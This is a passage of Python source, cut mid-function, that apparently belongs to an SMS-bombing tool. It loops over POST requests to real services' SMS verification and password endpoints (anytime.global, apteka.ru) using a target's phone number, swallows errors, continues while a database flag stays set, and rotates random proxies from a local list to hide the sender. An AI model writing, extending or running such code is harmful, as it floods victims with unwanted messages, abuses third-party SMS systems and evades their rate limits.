            post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        try:
            formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": formatted_phone, "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"}, headers=HEADERS,proxy=proxies)
        except:
            pass
        if db.check_thr(user_id) == "True":
            pass
        else:
            break
        
def generate_proxy():
    proxy_list = open("_subfiles\proxy\proxy.txt")
    proxies = []
    for line in proxy_list:
        proxi = ''.join(line)
        proxi = (''+proxi).split()
        proxies.append(proxi)
    proxy = random.choice(proxies)
    proxy = ''.join(proxy)
    proxy = {"HTTP":proxy}
    return proxy